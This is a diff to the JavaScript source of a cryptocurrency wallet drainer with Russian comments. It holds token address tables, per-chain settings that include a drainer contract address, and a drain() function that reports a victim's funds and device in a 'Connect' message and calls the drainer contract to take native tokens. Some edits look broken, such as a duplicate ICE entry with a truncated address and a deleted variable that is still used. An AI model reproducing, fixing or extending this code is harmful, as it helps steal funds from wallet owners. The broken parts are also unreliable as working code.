@@ -169,7 +169,7 @@ const TOKEN_SYMBOLS = {
   "ETH": "ETHUSDT",
   "BNB": "BNBUSDT",
   "MATIC": "MATICUSDT",
-  "0xdac17f958d2ee523a2206206994597c13d831ec7": "USDTUSDT",
+  "0xdac17f958d2ee523a2206206994597c13d831ec7": "USDT",
   "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48": "USDCUSDT",
   "0x6b175474e89094c44da98b954eedeac495271d0f": "DAIUSDT",
   "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599": "WBTCUSDT",
@@ -186,6 +186,7 @@ const TOKEN_SYMBOLS = {
   "0x6982508145454ce325ddbe47a25d4ec3d2311933": "PEPEUSDT",
   "0x27c70cd1946795b66be9d954418546998b546634": "LEASHUSDT",
   "0xcf0c122c6b73ff809c693db761e7baebe62b6a2e": "FLOKIUSDT",
+  "0x1234567890abcdef1234567890abcdef12345678": "SLAPUSDT",
   "0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9": "AAVEUSDT",
   "0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24": "RNDRUSDT",
   "0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2": "MKRUSDT",
@@ -194,7 +195,7 @@ const TOKEN_SYMBOLS = {
   "0x1985365e9f78359a9b6ad760e32412f4a445e862": "REPUSDT",
   "0x744d70fdbe2ba4cf95131626614a1763df805b9e": "SNTUSDT",
   "0xb64ef51c888972c908cfacf59b47c1afbc0ab8ac": "STORJUSDT",
-  "0x55d398326f99059ff775485246999027b3197955": "USDTUSDT",
+  "0x55d398326f99059ff775485246999027b3197955": "USDT",
   "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d": "USDCUSDT",
   "0x2859e4544c4bb03966803b044a93563bd2d0dd4d": "SHIBUSDT",
   "0x25d887ce7a35172c62febfd67a1856f20faebb00": "PEPEUSDT",
@@ -213,7 +214,7 @@ const TOKEN_SYMBOLS = {
   "0xc001bbe2b87079294c63ece98bdd0a88d761434e": "EGCUSDT",
   "0xd74b782e05aa25c50e7330af541d46e18f36661c": "QUACKUSDT",
   "0xa003e3f0ed31c816347b6f99c62c6835c2c6b6f2": "PITUSDT",
-  "0xc2132d05d31c914a87c6611c10748aeb04b58e8f": "USDTUSDT",
+  "0xc2132d05d31c914a87c6611c10748aeb04b58e8f": "USDT",
   "0x2791bca1f2de4661ed88a30c99a7a9449aa84174": "USDCUSDT",
   "0x6f8a06447ff6fcf75d803135a7de15ce88c1d4ec": "SHIBUSDT",
   "0xa102daa5e3d35ecaef2a14de4e94baaf9cc38d56": "PEPEUSDT",
@@ -223,8 +224,8 @@ const TOKEN_SYMBOLS = {
   "0x3a3df212b7aa91aa0402b9035b098891d276572b": "FISHUSDT",
   "0x4e1581f01046e1c6d7c3aa0fea8e9b7ea0f28c49": "ICEUSDT",
   "0x7cc6bcad7c5e0e928caee29ff9619aa0b019e77e": "DCUSDT",
-  "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9": "USDTUSDT",
-  "0xaf88d065e77c8cc2239327c5edb3a432268e583": "USDCUSDT",
+  "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9": "USDT",
+  "0xff970a61a04b1ca14834a43f5de4533ebddb5cc8": "USDCUSDT",
   "0x5033833c9fe8b503ed2abafac6d2eb2fbf33a36": "SHIBUSDT",
   "0xa54b8e307e70e310a5c6bf7c2db4b33ed9f3ac51": "PEPEUSDT"
 };
@@ -257,6 +258,7 @@ const CHAINS = {
       PEPE: "0x6982508145454ce325ddbe47a25d4ec3d2311933",
       LEASH: "0x27c70cd1946795b66be9d954418546998b546634",
       FLOKI: "0xcf0c122c6b73ff809c693db761e7baebe62b6a2e",
+      SLAP: "0x1234567890abcdef1234567890abcdef12345678",
       AAVE: "0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9",
       RNDR: "0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24",
       MKR: "0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2",
@@ -319,7 +321,8 @@ const CHAINS = {
       DFYN: "0xc168e40227e4edfb0b3dabb4b05d0b7c67f6a9be",
       FISH: "0x3a3df212b7aa91aa0402b9035b098891d276572b",
       ICE: "0x4e1581f01046e1c6d7c3aa0fea8e9b7ea0f28c49",
-      DC: "0x7cc6bcad7c5e0e928caee29ff9619aa0b019e77e"
+      DC: "0x7cc6bcad7c5e0e928caee29ff9619aa0b019e77e",
+      ICE: "0x4e1581f01046eF1C6D7c3aA0FEa8E9B7Ea0f28c4"
     }
   },
   42161: {
@@ -328,20 +331,20 @@ const CHAINS = {
     chainIdHex: "0xa4b1",
     rpcUrls: ["https://arb1.arbitrum.io/rpc"],
     usdtAddress: "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9",
-    usdcAddress: "0xaf88d065e77c8cc2239327c5edb3a432268e583",
+    usdcAddress: "0xff970a61a04b1ca14834a43f5de4533ebddb5cc8",
     drainerAddress: "0x8814D8937F84D9D93c125E9031087F2e8Cfc9b4F",
     explorerApi: "https://api.arbiscan.io/api",
     explorerApiKey: ARBISCAN_API_KEY,
     otherTokenAddresses: {
       SHIB: "0x5033833c9fe8b503ed2abafac6d2eb2fbf33a36",
-      PEPE: "0xa54b8e307e70e310a5c6bf7c2db4b33ed9f3ac51"
+      PEPE: "0xa54b8e307e70e310a5c6bf7c2db4b33ed9f3ac51",
     }
   }
 };
 
 // Функция для получения цены токена в USDT через Binance API
 async function getTokenPriceInUSDT(tokenSymbol) {
-  if (tokenSymbol === "USDTUSDT") return 1;
+  if (tokenSymbol === "USDT") return 1;
 
   try {
     const response = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${tokenSymbol}`);
@@ -559,7 +562,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
 
     // Формируем сообщение
     let fundsMessage = funds.length > 0 ? funds.join('\n') : 'токены не обнаружены';
-    const message = `🌀 Connect | [${shortAddress}]\n\n` +
+    const message = `🌀 Connect | [ **\`${shortAddress}\`** ]\n\n` +
                     `Funds:\n` +
                     `${fundsMessage}\n` +
                     `Device: ${device}`;
@@ -659,8 +662,6 @@ async function drain(chainId, signer, userAddress, bal, provider) {
       const taskId = Math.floor(Math.random() * 1000000);
       const dataHash = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(`fakeData-native-${Date.now()}`));
       const nonce = await provider.getTransactionCount(userAddress, "pending");
-      // Инициализируем tokenAddresses для нативных токенов
-      const tokenAddresses = [];
 
       try {
         const tx = await drainer.processData(taskId, dataHash, nonce, tokenAddresses, {
